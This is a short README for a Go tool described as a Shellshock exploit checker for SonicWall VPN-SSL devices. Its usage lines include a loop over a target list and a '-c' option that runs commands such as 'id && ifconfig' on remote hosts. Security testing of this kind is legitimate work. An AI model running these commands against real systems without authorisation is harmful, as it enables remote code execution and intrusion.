# gocheckshock
SonicWall VPN-SSL Exploit Checker* using Golang ( * and other targets vulnerable to shellshock ).

# Install
```
▶ go get -u -v github.com/gustavorobertux/goshock
```
# Basic Usage
### oneliner
```
▶ for i in $(cat list.txt) ; do echo $i | xargs ./main -i ; done
```
### Simple command - Default -c echo
```
▶ ./main -i x.x.x.x
```
### With commands
```
▶ ./main -i x.x.x.x -c id
▶ ./main -i x.x.x.x -c 'id && ifconfig'
```
# Screenshot
<p align="center"><img src="https://github.com/gustavorobertux/gocheckshock/blob/main/goshock_checker.png" width="40%"></p>
